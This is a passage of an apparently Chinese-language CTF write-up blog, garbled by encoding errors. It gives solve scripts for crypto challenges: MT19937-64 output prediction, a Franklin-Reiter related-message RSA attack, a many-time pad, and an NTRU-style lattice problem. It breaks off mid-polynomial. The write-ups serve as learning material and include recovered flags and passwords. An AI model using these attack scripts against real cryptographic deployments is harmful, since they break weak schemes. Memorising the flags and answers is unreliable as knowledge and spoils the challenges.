h = bound // multiple idx = multiple print(hex(l),hex(h),count) bound *= 0x100 if abs(h - l) \u0026lt; 2: flag = True break rr = bytes_to_long(long_to_bytes(pwd)[:prefix_length]) * 2**(8*(11 - prefix_length)) multiple = idx * 0x100 + binary_ptr m = oracle([y1,y2],multiple,p) if combineKey(m,rr): if binary_ptr == 255: prefix_length += 1 h = bound // (multiple + 1) idx = multiple + 1 print(hex(l),hex(h),count) bound *= 0x100 if abs(h - l) \u0026lt; 2: exit(0) break assert_arr[binary_ptr] = 0 binary_ptr += diff diff //= 2 else: assert_arr[binary_ptr] = 1 binary_ptr -= diff diff //= 2 context.log_level = \u0026#34;debug\u0026#34; endkey = long_to_bytes(h) key = prefix + endkey success(\u0026#34;get key:\u0026#34; + key.hex()) data = b\u0026#39;I am Alice, Please give me true flag\u0026#39; cipher = AES.new(key , AES.MODE_ECB) data = cipher.encrypt(pad(data)) server_shell.sendline(data) msg = server_shell.recvuntil(\u0026#34;\\n\u0026#34;,drop = True) print(cipher.decrypt(msg)) å‚è€ƒ # https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/ä¸ç»æ„ä¼ è¾“/README.md\nhttps://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/#pohlig-hellman-algorithm\nè²åŸæ¯ ç»å…¸éšæœºæ•°Yusaçš„å¯†ç å­¦è¯¾å ‚â€”â€”MT19937 # åˆæ˜¯è¿™ä¸ªç³»åˆ—çš„é¢˜\næœ‰ä¸‰ä¸ªæ–‡ä»¶éƒ½å·²ç»ä¸Šä¼ è‡³\rgithubä»“åº“é‡Œäº†\nè™½ç„¶è€ƒç‚¹è¿˜æ˜¯MT19937ä¼ªéšæœºæ•°ï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯åœ¨C++ä¸‹å†™çš„ï¼›ä¹‹å‰å‘è¿‡å…³äºè¿™ç±»é¢˜çš„æ–‡ç« ï¼Œä½†ä»Šå¤©å»çœ‹å†™åœ°å¤ªçƒ‚äº†ï¼Œå¤„åˆ‘ä¸€ä¸‹ï¼Œå®Œå…¨æ²¡æœ‰ææ‡‚å˜›\nhttps://4xwi11.github.io/posts/2d82e8aa/\nè§£å†³ä¸Šæ¬¡çš„ä¸€ä¸ªé—®é¢˜\nå¹¶éä¸æ˜¯éœ€è¦624ä¸ªæ•°ï¼Œè€Œæ˜¯éœ€è¦å‡‘è¶³32*624ä½ï¼Œä¹Ÿå°±æ˜¯64*312ä½\næ‰€ä»¥å¦‚æœæ˜¯çº¯pythonçš„è¯ï¼Œè¿™é“é¢˜åº”è¯¥ç§’å‡ºï¼Œä½†é—®é¢˜æ˜¯C++ï¼›è¯•äº†ä¸‹å°±ç®—ç»™ç›¸åŒçš„ç§å­ï¼Œä½†ç”Ÿæˆçš„éšæœºæ•°åºåˆ—ä¹Ÿæ˜¯ä¸åŒçš„ï¼Œç®—æ³•ç•¥æœ‰å‡ºè·¯åº”è¯¥\nä»£ç ä¸é•¿ï¼Œè´´ä¸€ä¸‹\nimport subprocess\rimport os\rimport random\rimport hashlib\rsubprocess.run([\u0026#34;g++\u0026#34;, \u0026#34;random.cpp\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;random\u0026#34;, \u0026#34;-std=c++11\u0026#34;],check=True)\rproc = subprocess.Popen([\u0026#34;./random\u0026#34;],stdin=subprocess.PIPE,stdout=subprocess.PIPE)\r# out, err = proc.communicate(str(int(os.urandom(8).hex(),16)).encode() + b\u0026#34;\\n\u0026#34;)\rout, err = proc.communicate(str(16063322316592949072).encode() + b\u0026#34;\\n\u0026#34;)\rdata = out.strip().split()\rflag = random.randint(0,len(data))\rFLAG = b\u0026#39;DASCTF{\u0026#39;+hashlib.md5(data.pop(flag)).hexdigest().encode()+b\u0026#39;}\u0026#39;\rdata = list(map(int,data))\rwith open(\u0026#34;outputs_%d.txt\u0026#34;%flag,\u0026#34;w\u0026#34;) as f:\rf.write(str(data))\r#include \u0026lt;cinttypes\u0026gt;\r#include \u0026lt;iostream\u0026gt;\r#include \u0026lt;random\u0026gt;\rint main() {\ruint64_t seed;\rstd::cin \u0026gt;\u0026gt; seed;\rstd::mt19937_64 rng(seed);\rfor (int i = 0; i \u0026lt; 1000; ++i) {\rstd::cout \u0026lt;\u0026lt; rng() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;;\r}\rreturn 0;\r} å¥½äº†ï¼Œå¼€å§‹è®²è¿™é“é¢˜çš„æ€è·¯\nè¿™å¼ å›¾å‡ºæ¥çš„æœ‰ç‚¹æ—©ï¼ˆdogeï¼‰\nå…ˆçœ‹åˆ°æœ€åï¼Œè¿™ä¸ªflagåœ¨æ–‡ä»¶åä¸­ï¼Œå°±æ˜¯popå‡ºæ¥çš„ä¼ªéšæœºæ•°ï¼Œæ˜¯374\nwith open(\u0026#34;outputs_%d.txt\u0026#34;%flag,\u0026#34;w\u0026#34;) as f:\rf.write(str(data)) ä½†å¯æƒœæ ¹æ®popï¼Œè™½ç„¶æˆ‘ä»¬çŸ¥é“dataï¼Œä½†æ˜¯æ˜¯åˆ é™¤äº†åŸç¬¬374ä½çš„data\néœ€è¦é€šè¿‡å…¶ä½™373+625ä¸ªæ•°å­—æ±‚å¾—è¿™ä½\næ˜¾ç„¶æ ¹æ®ä¹‹å‰çš„mt19937predictorï¼Œå’Œå‰373ä½ï¼ˆè¿™ä¸ªä¸Šé¢åˆšè§£é‡Šè¿‡ï¼‰ä»¥åŠåé¢çš„625ä½ï¼Œæ˜¯å®Œå…¨å¯ä»¥è·å¾—çš„ï¼Œç„¶åå†å¾—åˆ°ç¬¬374ä¸ªï¼Œæ‹¿æ\nå¯æ˜¯è¯•è¿‡äº†ä¸è¡Œï¼Œç”¨äº†æ¢å¤çš„æ–¹æ³•ä¹Ÿä¸è¡Œï¼›ç„¶åå°±æƒ³æ˜¯ä¸æ˜¯C++çš„é—®é¢˜\næ‰€ä»¥æ¥ä¸‹æ¥çš„æœç´¢æ€è·¯å°±å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæœç´¢å…³é”®è¯c++å’Œmt19937ä»¥åŠpredictï¼Œå½“ç„¶ä¸€èˆ¬éƒ½è¿”å›32ä½çš„ç»“æœï¼Œæ‰€ä»¥åŠ ä¸Š64ï¼›åŸé¢˜åˆ°æ‰‹\næ”¹ä¸‹joæœ¬å°±æœ‰\n#!/usr/bin/env python3\r# -*- coding: utf-8 -*-\rfrom mt19937_64 import mt19937_64\rimport hashlib\rres = [15224110489171130169, 1487925206988459477, 13480727356180709371, 9868256411224235526, 6217804851957837168, 16087170136679200450, 10701512125563075829, 13839719157982856576, 17686330611486610733, 8009416170371519873, 5970669226517080452, 11269217943220347675, 10679128876184101302, 18426494309927575430, 2766502893811979226, 2252796059596895410, 9426444128738501522, 11240845202238046967, 10773508588111955623, 1557877671900503598, 10687052904024584487, 1329391365184628727, 7924797549450027243, 8535390433774276870, 3764662861183967374, 2246153524896469598, 2609915142724872757, 10658867097171399935, 5527882090828515536, 16980061916688614551, 369781677154768879, 16440083865102214341, 6215352314823709568, 7140216739817729337, 12081906179615786779, 6478685619216942062, 9619055260791569210, 1716773987678792695, 5781591055396867866, 10236249441362668669, 4314491602044042424, 9076763991771914801, 1019089589927696539, 12783145303781447438, 1784730974216681496, 10724359773647505800, 9412346711065789784, 12397469196070741661, 844871001521064632, 13554026965219580112, 4176961812003667679, 6038315983316303141, 3991176913179867636, 7277063843827680934, 6593392965255927508, 7279379575539700793, 7049180319367268844, 2484858153711481256, 9662542622219218463, 15645318283754749515, 7848634356524747132, 6328770785215004957, 14031726511284712999, 10754197358715401067, 14877197602427408826, 1961981170873480756, 15043831614315156076, 2703733192099380300, 5573267746680488476, 2588678833804270160, 16641900531805836732, 14485077651674686804, 17908682116840210486, 12129346423391778925, 449323128784312129, 2912052724053440605, 3725415122737515057, 12106075465626310804, 7844624661111246261, 4336975117722586651, 6133486737560458810, 4285708852412482387, 17320873594107961221, 18154223303204659281, 9782280317517313987, 7359883602982876716, 8302270318241074541, 2854871868457850608, 4260073478828444220, 12464166743488435720, 11545300218414290638, 15943917616147672791, 17684529969128042573, 11970487736986863722, 4279463896104155311, 6452386490939306659, 14951002814044492267, 3924373366113113482, 17675004214657643053, 10514060213491578166, 5083735479763236962, 8237048074291002693, 178024658423258428, 16217384550361068797, 6823885072554733775, 14640293890442769000, 11118102735797335929, 17687811899187265346, 12324758265458544032, 13305186849598403772, 2061361200506122451, 4473679754720240444, 15364566282531130774, 10360818283823976655, 17220043518084908852, 9386042935320331823, 10932555460714805145, 14286030551222176204, 5513294049464657489, 9643782458509542843, 2950842616838528179, 16153550634060410597, 10622243240110203305, 1642938210383117587, 16348894212565750617, 17802404752703029833, 16933001622790235864, 13021337058260052257, 17301160463217879931, 4914154622730751038, 3649150598994385675, 17138640742876844054, 6723182378145435688, 15799828338293133322, 994720218982390675, 10557290726979603665, 17714019041621996643, 13997848863450584994, 11077445104717373075, 2834856239311065051, 11214787995926447582, 4068838695613829268, 3318186966385494373, 10984597623033520694, 5515414919887778777, 7222755179917827587, 16315875605087375576, 1416504086864662519, 9102186857132686420, 10069600536464217172, 6582524821522410340, 15369756932292150641, 17542632941176957329, 6114252881995050176, 2055179652476914195, 16405356136326356060, 14344232008993353644, 7357227068527869292, 14444189009256502503, 474793712655159763, 7277957134452370555, 10136894698074936516, 16493593438906441399, 965972604086413481, 7698637742708237198, 14701582675687476239, 8687372870093533304, 8617910444450923438, 9198266698377902297, 17663341461584809487, 9416311128064169723, 15527623086766043739, 17634355913948865190, 18230067880107976101, 14647282067432289184, 2666571742016867486, 35944775638564196, 13202068495097382260, 9200881323819852309, 4609224846213708248, 18385087669463550574, 10907111573029619720, 3677665280613822779, 7175067246924173873, 11557554314793111361, 16459269098754836930, 15069426419433415372, 3478942161672373533, 1475410410806061275, 3951913608914307936, 9031385401155758661, 3487921219891556908, 14331439795449455643, 18005194978393081205, 17499558816128213969, 10013697255070423725, 5656707783041395866, 8245156232824114523, 5484825401635850101, 18276565390397117490, 9806016278660472039, 6246223529755503034, 16322603114524844950, 13512386112109766619, 4292997062471342719, 5482339873158479974, 12153068771020641259, 18134128714075076811, 3921582705345984456, 17990063870067007106, 11893303237020637674, 584000375933180982, 6837860293438757570, 8668590806728300645, 10930322698482157784, 3456591010166906694, 8479176164660731035, 1378913458575066776, 11867206231852016448, 11155774780214677606, 912636353429261442, 17286540002553508524, 2342876557589322779, 8472494814582696749, 1649463863153987977, 6639761134830802698, 17749792536888103944, 6682611142368155837, 8961391229631067960, 16808632462882238050, 12764361808843833740, 3494650449008997672, 13464542575897195823, 424905026997643448, 6949880018570988189, 4352171970901905656, 7585977087659274602, 9963800442502096068, 11967585318365690786, 1330206767381639342, 8961211309807685961, 12822173985081341335, 4508173450257371182, 5828692808060501375, 7437728885533218362, 11924888116770741814, 2012177013990519412, 6499123439580002081, 13085942749253543550, 12967954280047984193, 401135611301783756, 3748733649551258520, 3742761952933734129, 7180568637515019340, 8490711531714639868, 1461899626173313114, 15357996742461975417, 14566908736002266815, 18368411028248688780, 2276282088146233438, 13500510232438577028, 5042075854511929699, 6430943865985944461, 4611615451136427723, 16501718400150227301, 12689032035555572221, 15097412730296922717, 3917094315801026114, 2738852375492418821, 16365967597393176630, 15062401340541737624, 14638139755970734808, 17586333334851266372, 17319918915751492871, 11845068873340136881, 1459249680175909613, 7472745361441793631, 1812384806700690960, 8855007047564417997, 2163690632469050637, 1883216720349119806, 17992478845633263598, 4665099551190282678, 11678011021345341884, 14187013186800119116, 14052476937717753457, 14759086517840933234, 5009467219504023390, 4622766434224603629, 14306333222661486071, 3858064603145888263, 5480134807934395111, 4123024571389908319, 4857052736700414325, 16243980005326285458, 3632766067814039781, 710008964341406746, 5363960844618609694, 14114730195035015808, 16428297947621094568, 7700974694607772814, 16793381582485703202, 13948380472150916306, 14326581900789123198, 4228968193234651142, 11100829582225662535, 17495023276082596914, 8634787791698085471, 6145765583313197421, 16788430897014030178, 11435692770927277650, 18065086017618584565, 11769581244567937207, 13278489473631493919, 8019460929320111149, 5693618935245539106, 3634811597737081216, 12859793273631344580, 11287301384880619752, 18394782048366983264, 7421132200962846807, 4084540937457316264, 13113874388366064762, 8131358879566215449, 18127561595469413694, 8734770900165404534, 17424357262393464853, 10097252723684474013, 13657127819021358228, 15053911843606144518, 7213762907694003185, 9201850376693257882, 1152437224214832892, 14749316667846084768, 13945981875336291326, 17205113012613835387, 17208682023098019636, 16837244935188768969, 1562887481274292099, 4817091557053520861, 12788128805488570720, 12001115261194850091, 4003771944165077120, 2234627252583081046, 9648802166794733209, 2217782127954322431, 8813298931273365931, 8055654179906713224, 11975882101529377223, 3484952924454621378, 9405558259370977621, 10465136460923462995, 10114188036427722127, 3137605056932583175, 6052770256806365938, 13216705997825407019, 9321595432845767721, 7404913363748792748, 3104222247113734338, 7884841839505302190, 10282600744363227974, 10560288140635802837, 345714099277926722, 14827599919753819919, 15348137034782912153, 117188792560235416, 721765732450403598, 13484574492955662118, 4088456941206683834, 7978001820773876706, 3458688202384309003, 7297824025882346112, 8366103370544240004, 14726906913567147182, 17890463553725848943, 11056300998383817861, 12172218496062907284, 5614991059403362329, 94695117905761066, 13704554396573869457, 6942259376738368761, 3724125954238286617, 605665642089906206, 4440357634786283101, 9312356527281045726, 18433419763563298916, 5537070555239228268, 13655980751929630271, 11097112793938372280, 7029091093125181071, 15682558111863651240, 9864810256451039130, 5940287037201593945, 7230113292992804565, 1262540470928338201, 9310270195989362278, 5911475921308141211, 5943394248414176333, 2467090711423218798, 14834589937967531968, 2112412521637455955, 4483762121635552341, 9203453183301626690, 12517949271946792756, 11765267562048769695, 2130431799048385018, 1021118212271885825, 4527525148317213493, 2666979235110630076, 11385323575772505236, 1957143482002768471, 6653869545594001852, 9403787903811093312, 8793399260966849492, 9134129177479686128, 5344549741728076030, 3785525706196259331, 4098427281238979781, 14780185570363454606, 15022528285132147394, 4415868057026363350, 11652850077219368760, 6599101465769202844, 2324709069440458374, 2328030874184313596, 5375810578496425005, 3324352283736262699, 8961596405474061089, 17555556238164816340, 1217170962166712882, 12300833475020082526, 5755163501951705747, 17673007557139716816, 5400175616849815689, 16424974447872124521, 3528336073009821153, 5677112613986511204, 11681713850480599971, 17889123911033641068, 13398947136669841280, 14362332277634552597, 12612291562289233371, 9068021764334224282, 11003726667849614111, 170500049009536169, 11787850295471586749, 17738376378319933104, 265438126753187088, 16449969716110589415, 4267181961918958684, 8504721844419720345, 3602399335681951800, 16377130351527521329, 137205552767822057, 15076083541717516190, 16933079658536833273, 11539760435976559163, 10349113249022571006, 13506623588121209051, 1767257281718218581, 55497369433803178, 9620183217554454747, 352109299759977748, 13362871402671548794, 3245933715092323519, 7098945802580095824, 4749740144906242542, 16475573756134089178, 17665764356947420150, 2428128185580929142, 10865799872171434959, 14020645350131532589, 10866919792482735515, 1639413999413384841, 2660467607619573650, 7176921049243916372, 44929497464104249, 8302026006819056308, 14088827593384756939, 4541386427308185948, 14992023310005249339, 11521110449882379692, 8618468396936995487, 17255690317020962535, 14459878492479278129, 484161739083752565, 8967126682428339806, 12208164843579773375, 11736932142677088849, 7727530756457513692, 3829808422387045462, 9815185898534079561, 8586014595553015140, 3121180959957037281, 546542310230906996, 12788213799003801890, 6764098612553553982, 16230764669201238834, 18205877184448874064, 17741584570061449195, 13498693246362717293, 12557996638970667763, 16240767280840697248, 12688455377024311919, 11821568382422290340, 13694830011903255027, 15977888673915506876, 12346885892635259078, 7838634663919088845, 13697951298959265290, 16396403340832798324, 5570724586621569543, 348190538972825181, 498434119496336507, 4629603637537989875, 2904956541370261046, 15056806750205280060, 12512751698356956353, 11598492895309981739, 5900963668615601483, 9286588840856606265, 14687331465648814630, 724531149460506959, 17016613597390705501, 17860966464838170961, 8082441243109422217, 4226070025033485357, 11557581090421115709, 1365974406386375567, 11626532849062235723, 3026767794107211866, 18265729906007136324, 9752072017332967624, 8344899021234511823, 17168023990850847933, 2108491903973827339, 16946871590663953204, 15268856540448037497, 6729814538132205074, 10608459573931314294, 5349389425094153624, 9119249437078259281, 3022057742231131843, 699495075963768616, 3938180359891046702, 3132000820601213475, 6453763775620458305, 10361983187468507141, 18091129984666032675, 4573010375750843342, 791243713554231377, 6523321933147523990, 2460943155031244372, 11915079949168514844, 10962272930784254451, 7828398430854164950, 11580373300607261323, 14496114508805667408, 12800088002722989479, 4489382774379581027, 6241885538530491013, 15369736452242646419, 18339907485699833664, 14843607724306799380, 15883998472835946312, 13401911608426527924, 3615974264171478906, 2951259064496198811, 7803436242736563826, 4135188636826481442, 5021264042001895982, 5708915960985917130, 11181910501244483073, 5573954009605843738, 3021445895744683140, 10033196279958934660, 2680855996735532569, 5360189858868901361, 8167521138921792938, 6161893524269697852, 5558764473993615110, 13408224815379298518, 17751136251534065932, 12169040946650623409, 8591752444091873275, 17571132974848304944, 16886102890910720967, 10434431909683674783, 1798513582887417581, 4922950544911394484, 436078592099283889, 10061099463464191790, 2611739359719785328, 12076811020743303539, 2799012545596479383, 12408665237686526887, 2569240801657154200, 189527510828503181, 17204452437985213973, 15873367317020085673, 4668478220806245681, 2950905851413543275, 17244737907264565987, 9947196811151946334, 10861412944742179841, 17691963506930352, 8645426666922253783, 5429177116065336723, 9148166318339274858, 1140817301847500253, 16395024534726001957, 14455719375367518785, 14365592159046307404, 4233672053992875940, 7055944177387857447, 13438827615850026797, 1980459165532258112, 9924227990341676772, 1258768952545009550, 11361136852134788879, 4300533493752614933, 14681866951052377042, 8810851615125798911, 8542930103562314876, 14579475506918455576, 16047523528880779866, 1380610643416544755, 12076763661431463653, 13633351579395427301, 14309637244904670356, 2784919727650036805, 10011701223131936197, 16483582182156980016, 8123259590358566068, 15547670775408355653, 17114873767724596286, 15947690112937005468, 7121267006666076401, 15013329343112101948, 6864703775066800136, 2091646091797307547, 11775971286169844616, 13169145274668540822, 18168794334896751614, 8757043158271235193, 12162217691779194844, 10986813166707328024, 4635742872437686441, 9862874769906586011, 5685640425162748748, 16154828004824450666, 12628559068947614691, 18330543771355967176, 9613516487817756865, 11541501577179857879, 14497414068611647595, 16303734492840330251, 3271500016365005027, 3388428085388242514, 1510190073604428294, 10472797328548283957, 9702728991503878250, 3428420960955188888, 6445224698406122174, 5824974369892172376, 6434707946773025269, 2528556873146891935, 6653952898338236677, 432032921329160914, 11760277815966837524, 9034646482280577053, 2164586012669056137, 2616742534894002775, 942200230707617758, 5327259632525477213, 13158846232145762876, 418213563708326684, 13494580607955344451, 13712793184114793941, 13061962736775979494, 1304785696522982742, 6636575085535497783, 2548707152553606937, 5179609242429207458, 216456340969811386, 8504681751639758545, 18283819579633351371, 8667595238380606433, 15751060841552119650, 10368350373271876373, 2271051687544383713, 9387982608299096176, 5067191246740902300, 2164563749890672481, 1441096478400860673, 1698497919091504741, 7070556267349479512, 12383115351862498978, 4393914787565756921, 4843292715860537520, 1308644180050696570, 14727896807325886230, 5278800618172724513, 12682261375578839563, 2292210517400729441, 4539831393791783686, 11184877751085848181, 10455063755670025488, 4090948952473244180, 16140611536328585842, 4009612709629840807, 11680437954598062018, 7483349842877448300, 15595722655987483, 6218105392300937979, 4230977848731176695, 13608604339767291094, 15450864502883571776, 14522043162137067612, 17407306325856924818, 4319385475362004982, 3602607459242950116, 12919519173298379659, 17034295612889519066, 16366395208098028226, 16902437965740309665, 2976505459482736335, 13462949500218242510, 9986640179928306819, 15767966148754567460, 5987675944577047926, 908917886808113767, 7775521308318543697, 8554839413248075973, 15830102725396509035, 4299599343707193551, 151253289791368809, 2074429061050605186, 7050639080325887498, 7147021929133361313, 17288365729620621043, 13258996835492542256, 9813891614733236908, 18409516239359796503, 6114024626644998222, 5075084268262314250, 9316231926255260786, 5482842808296472097, 9445382679464571342, 341224484511902160, 13784129997188624024, 7368235505308494752, 9538628927204464393, 15343501567237040869, 17821228923098686582, 11856702827887607105, 4609368864524898262, 14712861947435117594, 10899071438470157317, 9590771163252554239, 18239878173866313008, 17348232285102511866, 7979447902828438866, 10189744825270231378, 15897242279714161903, 6814376918912188976, 14160295163213869895, 3756399085747026247, 7851944732036371005, 11096596485883534745, 17528766768147904271, 12327736621720397026, 17199643471105880304, 1457112013787956971, 4273300114441781498, 15938254022202331850, 12502089261484299213, 4148861150304071474, 16774360387122462360, 4693230099623568126, 4923228118836213154, 9672193860921898593, 12031664828792019070, 5538759348099426194, 16607999864018217913, 12801100377914190264, 3714468733303697571, 15066120849955539008, 8667181143710237426, 11054461905529698068, 5000947219599965404, 13679544882732214263, 12329024745774068972, 5097030027906429561, 623294247887615792, 7749632090228054556, 7348314875737386281, 15051320008802373451, 2316565134939415828, 15735407710770638384, 11219541286219768213, 204970242910995613, 2942251758669266767, 2446839436006958427, 5818242570475463614, 13952882162210790154, 1091967561799274001, 815669942787526663, 17619502901620723825, 16225434478481351091, 3458534598924545265, 13105176322289080982, 11660428227784960936, 17456917329772545202, 17370020327039448988, 9872223534315941551, 11134891555868721043, 7366592335535613164, 17901061154562355983, 11133114536770437092, 1216102370074140712, 12369779197340106392, 15587264963667110618, 9839321331851277149, 9504232653874690416, 3277515784377114968, 11059930209112798658, 2233223095276440320, 8766259643725656785, 2981451568249872324, 16923059343824130016, 10424762723653272247, 5892364915443744172, 5076056599547198181, 8353569794147013632, 68280038528939863, 13688795951892474996, 18383293316785491223, 16830221144227410771, 7584798539822253809, 16154968662715915283, 15260829610123279933, 4877893352139268298, 12344113633536211040, 12755524932207520008, 5908761689287331221, 10710685683019125231, 13529779487666749860, 17058207837744409161, 16146404756880670361, 479722120166144953, 18441286007767994888, 291021007503523962, 18404478127831570654, 7161684062922444049, 13215140078849265993, 3557093399709796464, 8888690439305341966, 6505462940112971530, 8788739344222162420, 1559480144085566061, 12347917275519574148, 81829582595789879, 256554008735570761, 13242371414730122957, 11233874231428992467, 13642556384815692603, 15402098527178414517, 11899811780905828512, 17981855746545737550, 4198592355605474429, 5837385946994485658, 8495884884442446152, 14987601548279232776, 8084557976601943459, 1951816494581368991, 9198564418991457621, 7932995247156296394, 1727181807973386737, 6589861619929187838, 8606879269790701257, 4872437793541536276, 15996953415759653811, 9248501959204439487, 4430871643980849717, 14781923535395473967, 15369814218152848270, 8234249513592097579, 17526914633363815278, 12602191579658959446, 14791379194771288560, 5744799145746380430, 16286641132134680583, 14401259673433035989, 8781313506229705992, 15404783223179793847, 1240592003072635453, 6610236446870877009, 13844205871835893697, 5872162931619514680, 7969671272013520825, 2766019064081136959, 12517751573997673572, 9675763639282129596, 6287079859085827340, 13703850028043029227, 2177538632683478842, 6799380297638496469, 18086402650215147822, 6934362201312885542, 18313335318052001373, 11480263463655438919, 9106785110623113711, 7886399579140250642, 3228263571695418855, 16330664963396613091, 17040963948964130546, 10826606124423646728, 2004304733703582220, 6398041571715522263, 493137561871256273, 9640584407491032029, 16021497942534243559, 3278925318796881775, 13963508362353842195, 10912881406340519756, 12333002179163988752, 10955825398678638303, 13098738959421529927, 4516651215445389327, 560548562818360587, 6879446280544278794, 17586026517062529192, 3060809513700298266, 10921253043682209150, 3096750023591656316, 13400270480516947274, 14497399820138619643, 885203573443562232, 14340392236208331243, 2009503763921531273, 5844055580211151684, 11452679420109767541, 9889351505080896698, 12297221479872520074, 145327472993840493, 14415741022760094936, 8161272693495024070, 12628038780375717745, 5651066232426624946, 6800289990668254787, 5629827258100727980, 9532683887081871864, 17078228306713530437, 5752393712365853210, 9906279898480007557, 15575593797821095372, 7944135127159515198, 9274370606751170281, 8181946307601340138, 8855405836683610977, 10604653901416893787, 11825055110857035062, 4735989253296218178, 9585945902650058725, 16832571384429265203, 14392760261562270322, 14439958219835048793, 6845765491294793435, 10537690616100733378, 10290121783493343259, 17074695699105811516, 17508569400297966287, 15411447085789948953, 10245321407074763960, 1474249930147284650, 338858065124110851, 16523709105734298997, 17458843705270839631, 11471295397505031119, 6285176061334214908, 2705374183703063320, 12810847959239174924, 10260721046212143624, 4221085600703449212, 1200019904756589653, 10460179773211533763, 11823018480340155341, 9903187458931297940, 1139978577616698133, 5744593808037898897, 16758300938964610655, 7359351744825865326, 10862900264466009346, 3342859891404368697, 18254401553280819107, 17133307977473573143, 11714571723704738721, 8944205159183890163]\rpre = mt19937_64()\rpre.from_output(list(map(int, res[:312])))\ri = 0\rfor rand in res[312:]:\ra = pre.random()\rif int(rand) == a:\ri += 1\rcontinue\relse:\rFLAG = b\u0026#39;DASCTF{\u0026#39; + hashlib.md5(str(a).encode()).hexdigest().encode() + b\u0026#39;}\u0026#39;\rprint(FLAG)\rbreak ç¾å›¢ # easy_RSA # å¤–é¢ä¸€å±‚æ˜¯rsa padding attackï¼š\nn=0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79 e=0x3 encrypt_m=0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1 encrypt_m_1=0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8 def gcd(a, b): while b: a, b = b, a % b return a.monic() def franklinreiter(C1, C2, e, N, a, b): P.\u0026lt;X\u0026gt; = PolynomialRing(Zmod(N)) g1 = (a*X + b)^e - C1 g2 = X^e - C2 print(\u0026#34;Result\u0026#34;) result = -gcd(g1, g2).coefficients()[0] f = open(\u0026#34;data.txt\u0026#34;, \u0026#34;w\u0026#34;) f.write(str(result)) f.close() return result m = franklinreiter(encrypt_m_1, encrypt_m, e, n, 1, 1) from Crypto.Util.number import * print(long_to_bytes(m)) # the key is :everything_is_easy_in_this_questionCOPY å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼ševerything_is_easy_in_this_question\nè§£å¼€ä¹‹åæ˜¯many pad attackï¼Œå°è¯•ç¼©å°æ˜æ–‡å’Œkeyçš„tableçš„èŒƒå›´ï¼š\nfrom Crypto.Util.number import * from string import * print(printable.encode()) TABLE1=ascii_letters+digits+\u0026#34;{}_@#\\\u0026#34;| \u0026#34; TABLE2=b\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,{} \u0026#39; data = open(\u0026#34;one_time_cipher\u0026#34;).read().split(\u0026#39;,\\n\u0026#39;) data = [long_to_bytes(int(i, 16)) for i in data] print(data) key = [] for i in range(26): tmp_key = b\u0026#34;\u0026#34; for j in TABLE1.encode(): # flagçš„table yes = True for k in range(len(data)): if len(data[k])\u0026lt;(i+1): break tmp_m = j^data[k][i] if long_to_bytes(tmp_m) not in (TABLE2.decode()).encode(): # keyçš„table yes = False break if yes: tmp_key += long_to_bytes(j) print(tmp_key) key.append(tmp_key) TABLE = b\u0026#34;flag{it_1s_P@dd1n_@nd_p@d}\u0026#34; for k in range(len(data)): tmp_key = b\u0026#34;\u0026#34; for i in range(26): if len(data[k])\u0026lt;(i+1): break tmp_key += long_to_bytes(TABLE[i]^data[k][i]) print(tmp_key) # flag{it_1s_P@dd1n_@nd_p@d}COPY å¾—åˆ°flagï¼šflag{it_1sP@dd1n@nd_p@d}\nhttps://github.com/fghcvjk/MT-CTF-2021/tree/master/crypto/easy_RSA\nMar.DASCTF # threshold # é¢˜ç›®ä»£ç å¦‚ä¸‹\n#make.sage import random flag = bytearray(\u0026#34;DASCTF{********************************}\u0026#34;.encode()) flag = list(flag) length = len(flag) N=53 p=257 q=28019 d=18 f=[1]*19+[-1]*18+[0]*16 random.shuffle(f) g=[1]*18+[-1]*18+[0]*17 random.shuffle(g) Q.\u0026lt;x\u0026gt; = Zmod(q)[] P.\u0026lt;y\u0026gt; = Zmod(p)[] fx=Q(f) fy=P(f) gx=Q(g) Fqx=fx.inverse_mod(x^N-1) Fpy=fy.inverse_mod(y^N-1) hx=(Fqx*gx).mod(x^N-1) r=[1]*10+[-1]*22+[0]*21 random.shuffle(r) rx=Q(r) mx=Q(flag) ex=(p*rx*hx+mx).mod(x^N-1) print(ex) print(hx) å¯ä»¥å‘ç°æœ¬é¢˜çš„å†…å®¹å’Œ\r2020SCTF-Latticeå¾ˆåƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ®æ­¤å†™å‡ºexpï¼Œä¸è¿‡ç”±äºè¿™é“é¢˜ä¸­æ²¡æœ‰bal_modï¼Œæ‰€ä»¥ä¹Ÿå°±å¯ä»¥å»æ‰\nimport random p = 257 q = 28019 n = 53 Zx.\u0026lt;x\u0026gt; = ZZ[] e = 7367*x^52 + 24215*x^51 + 5438*x^50 + 7552*x^49 + 22666*x^48 + 21907*x^47 + 10572*x^46 + 19756*x^45 + 4083*x^44 + 22080*x^43 + 1757*x^42 + 5708*x^41 + 22838*x^40 + 4022*x^39 + 9239*x^38 + 1949*x^37 + 27073*x^36 + 8192*x^35 + 955*x^34 + 4373*x^33 + 17877*x^32 + 25592*x^31 + 13535*x^30 + 185*x^29 + 9471*x^28 + 9793*x^27 + 22637*x^26 + 3293*x^25 + 27047*x^24 + 21985*x^23 + 13584*x^22 + 6809*x^21 + 24770*x^20 + 16964*x^19 + 8866*x^18 + 